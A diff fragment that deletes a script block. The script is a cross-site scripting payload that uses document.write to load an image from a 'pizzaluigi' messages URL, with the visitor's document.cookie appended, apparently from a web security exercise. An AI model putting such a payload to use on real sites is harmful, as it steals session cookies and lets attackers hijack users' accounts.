@@ -1,5 +1,0 @@
-
-
-<script>
-document.write('<img src = "http://pizzaluigi/messages?to_user=ch&subject=sessionsss&message_text=hii?c='+document.cookie+'"/>');
-</script>
